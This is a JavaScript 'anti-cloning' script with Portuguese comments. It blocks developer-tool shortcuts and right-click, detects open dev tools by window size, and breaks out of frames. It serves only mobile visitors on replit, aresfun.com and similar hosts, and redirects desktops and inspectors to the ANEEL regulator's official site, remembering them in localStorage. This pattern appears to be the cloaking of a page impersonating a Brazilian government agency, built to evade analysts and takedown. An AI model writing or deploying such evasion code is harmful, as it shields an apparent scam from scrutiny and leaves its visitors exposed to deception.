/*
 * Script de segurança principal para proteção contra clonagem
 * Este script é carregado antes do React e implementa verificações de segurança
 * em nível de DOM e navegador para impedir a clonagem e inspeção do site.
 * 
 * Versão: 2.0
 * Data: 18/04/2025
 */

(function() {
  try {
    // Configurações
    const REDIRECT_URL = 'https://antigo.aneel.gov.br/';
    const DEBUG_MODE = true; // Habilitado temporariamente para testes no Replit
    const ALLOWED_DOMAINS = ['replit.app', 'replit.dev', 'localhost', '127.0.0.1', 'aresfun.com', 'aneel.gov.br'];
    
    // Funções de utilidade
    const log = function(msg) {
      if (DEBUG_MODE && window.console && console.log) {
        console.log('[Segurança]', msg);
      }
    };
    
    // Verificação de ambiente
    const isAllowedDomain = function() {
      const hostname = window.location.hostname;
      return ALLOWED_DOMAINS.some(domain => hostname.includes(domain));
    };
    
    // Verifica se é dispositivo móvel (simplificado)
    const isMobileDevice = function() {
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
      const isMobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      const hasOrientation = typeof window.orientation !== 'undefined';
      
      return isMobileUA && (hasTouch || hasOrientation);
    };
    
    // Verifica ferramentas de desenvolvedor pela diferença de tamanho da janela
    const checkDevToolsByWindowSize = function() {
      const widthThreshold = window.outerWidth - window.innerWidth > 160;
      const heightThreshold = window.outerHeight - window.innerHeight > 160;
      return widthThreshold || heightThreshold;
    };
    
    // Aplica proteções contra dev tools
    const applyDevToolsProtections = function() {
      // Desabilita teclas de atalho 
      document.addEventListener('keydown', function(e) {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        if (
          e.keyCode === 123 || 
          (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
          (e.ctrlKey && e.keyCode === 85)
        ) {
          e.preventDefault();
          log('Atalho bloqueado: ' + e.keyCode);
          return false;
        }
      }, false);
      
      // Desabilita clique direito
      document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        log('Clique direito bloqueado');
        return false;
      }, false);
      
      // Detector contínuo de dev tools
      setInterval(function() {
        try {
          const devToolsOpen = checkDevToolsByWindowSize();
          if (devToolsOpen) {
            log('DevTools detectado por tamanho de janela');
            localStorage.setItem('_ddb', 'true');
            window.location.href = REDIRECT_URL;
          }
        } catch (e) {
          log('Erro na verificação de DevTools: ' + e.message);
        }
      }, 1000);
    };
    
    // Aplica proteções contra frames
    const applyFrameProtections = function() {
      // Anti-framing: impede que o site seja carregado em um iframe
      if (window.self !== window.top) {
        log('Detectado carregamento em iframe');
        window.top.location.href = REDIRECT_URL;
      }
      
      // Impede que este documento seja aberto em um frame
      if (window.top !== window.self) {
        log('Detectado carregamento em frame');
        window.top.location.href = REDIRECT_URL;
      }
    };
    
    // Verifica anti-clonagem (domínio)
    const checkDomainCloning = function() {
      if (!isAllowedDomain()) {
        log('Domínio não autorizado: ' + window.location.hostname);
        window.location.href = REDIRECT_URL;
        return false;
      }
      return true;
    };
    
    // Verifica dispositivo móvel
    const checkMobileDevice = function() {
      // Verifica se o dispositivo atual é móvel
      const mobile = isMobileDevice();
      
      // Verifica cache anterior
      try {
        const cachedMobile = localStorage.getItem('_dvt');
        if (cachedMobile !== null) {
          if (cachedMobile === 'false') {
            log('Cache indica desktop, redirecionando');
            window.location.href = REDIRECT_URL;
            return false;
          }
        } else {
          localStorage.setItem('_dvt', String(mobile));
        }
      } catch(e) {
        log('Erro ao verificar cache: ' + e.message);
      }
      
      // Se não for móvel, redirecionar
      if (!mobile) {
        log('Dispositivo desktop detectado, redirecionando');
        try {
          localStorage.setItem('_dvt', 'false');
        } catch(e) {}
        window.location.href = REDIRECT_URL;
        return false;
      }
      
      return true;
    };
    
    // Verifica se o site já foi detectado como clone anteriormente
    const checkPreviousDetection = function() {
      try {
        const wasDetected = localStorage.getItem('_ddb') === 'true';
        if (wasDetected) {
          log('Detecção anterior encontrada');
          window.location.href = REDIRECT_URL;
          return false;
        }
      } catch(e) {
        log('Erro ao verificar detecção anterior: ' + e.message);
      }
      return true;
    };
    
    // Função principal
    const initialize = function() {
      log('Inicializando proteções...');
      
      // Sequência de verificações
      if (!checkPreviousDetection()) return;
      if (!checkDomainCloning()) return;
      
      // Em desenvolvimento, pular verificação de dispositivo móvel
      if (DEBUG_MODE || window.location.hostname.includes('replit') || 
          window.location.hostname.includes('localhost')) {
        log('Executando em ambiente de desenvolvimento, ignorando verificação de dispositivo');
      } else {
        if (!checkMobileDevice()) return;
      }
      
      // Aplicar proteções gerais
      applyFrameProtections();
      applyDevToolsProtections();
      
      log('Proteções inicializadas com sucesso');
    };
    
    // Executar quando o DOM estiver pronto
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initialize);
    } else {
      initialize();
    }
  } catch(error) {
    console.error('Erro crítico no sistema de segurança:', error);
  }
})();